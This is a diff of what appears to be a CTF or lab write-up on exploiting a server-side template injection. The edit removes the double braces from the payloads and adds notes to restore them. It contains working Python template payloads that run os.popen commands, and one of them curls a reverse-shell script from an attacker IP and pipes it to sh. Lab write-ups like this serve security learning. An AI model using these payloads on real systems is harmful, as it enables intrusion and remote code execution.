@@ -366,28 +366,28 @@ And this is how we can see the results in the `/debugresult`, don't forget to ad
 
 ![/debugresult.html](image-3.png)
 
-It looks like there is some `SSTI` vulnerability here, let's check it by supplying:
+It looks like there is some `SSTI` vulnerability here, let's check it by supplying this. (add double cruel brackets)
 ```bash
-{{7*7}}
+7*7
 ```
 
-it worked. we got back `49`.
+it worked. we got back `49`. 
 
 ![SSTI working](image-9.png)
 
 Okay, now we know it filters these chars `'&;%"`, so let's get payload from [https://swisskyrepo.github.io/PayloadsAllTheThings/](https://swisskyrepo.github.io/PayloadsAllTheThings/Server%20Side%20Template%20Injection/Python/#exploit-the-ssti-by-calling-ospopenread), without filters.
 
-I'll use this, it should execute `id`.
+I'll use this, it should execute `id`. (add double cruel brackets)
 ```py
-{{self.__init__.__globals__.__builtins__.__import__("os").popen("id").read()}}
+self.__init__.__globals__.__builtins__.__import__("os").popen("id").read()
 ```
 
 ![id executed](image-10.png)
 
 It worked! we got our `RCE`, yay.
-Let's use this payload, to get the `revshell.sh` from local machine, and then execute the `penelope` payload inside.
+Let's use this payload, to get the `revshell.sh` from local machine, and then execute the `penelope` payload inside. (add double cruel brackets)
 ```py
-{{self.__init__.__globals__.__builtins__.__import__("os").popen("curl http://10.9.2.147:8081/revshell.sh|sh").read()}}
+self.__init__.__globals__.__builtins__.__import__("os").popen("curl http://10.9.2.147:8081/revshell.sh|sh").read()
 ```
 
 ![burp request reverse shell](image-12.png)
